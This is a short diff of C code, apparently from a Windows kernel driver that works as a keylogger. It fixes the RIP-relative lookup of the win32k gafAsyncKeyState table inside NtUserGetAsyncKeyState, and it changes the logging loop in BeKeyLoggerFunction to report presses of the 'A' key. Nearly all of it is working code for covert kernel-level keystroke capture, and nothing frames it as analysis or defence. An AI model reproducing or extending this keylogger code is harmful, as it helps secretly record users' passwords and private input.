@@ -71,9 +71,11 @@ BeGetGafAsyncKeyStateAddress(PEPROCESS targetProc)
 		)
 		{
 			// param for MOV RAX QWORD PTR is the address of gafAsyncKeyState
-			address = (PVOID)(*(PUINT64)(ntUserGetAsyncKeyState + i + 3));
+			UINT32 offset = (*(PUINT32)(ntUserGetAsyncKeyState + i + 3));
+			address = (PVOID)(ntUserGetAsyncKeyState + i + 3 + 4 + offset); // 4 = length of offset value
 			LOG_MSG("%02X %02X %02X %llx\n", *(BYTE*)(ntUserGetAsyncKeyState + i), *(BYTE*)(ntUserGetAsyncKeyState + i + 1), *(BYTE*)(ntUserGetAsyncKeyState + i + 2), (PUINT64)(ntUserGetAsyncKeyState + i + 3));
-			LOG_MSG("%02X %02X %02X %llx\n", *(BYTE*)(ntUserGetAsyncKeyState + i), *(BYTE*)(ntUserGetAsyncKeyState + i + 1), *(BYTE*)(ntUserGetAsyncKeyState + i + 2), address);
+			LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(ntUserGetAsyncKeyState + i), *(BYTE*)(ntUserGetAsyncKeyState + i + 1), *(BYTE*)(ntUserGetAsyncKeyState + i + 2), offset);
+			LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(ntUserGetAsyncKeyState + i), *(BYTE*)(ntUserGetAsyncKeyState + i + 1), *(BYTE*)(ntUserGetAsyncKeyState + i + 2), address);
 			break;
 		}
 	}
@@ -120,12 +122,9 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 	{
 		BeUpdateKeyStateMap(procId, gasAsyncKeyStateAddr);
 
-		for (auto vk = 0u; vk < 256; ++vk)
+		if (IS_KEY_DOWN((BYTE*)keyStateMap, 0x41))
 		{
-			if (IS_KEY_DOWN((BYTE*)keyStateMap, vk))
-			{
-				LOG_MSG("%i TAB PRESSED\n", vk);
-			}
+			LOG_MSG("A PRESSED\n");
 		}
 
 		// Sleep for 0.1 seconds
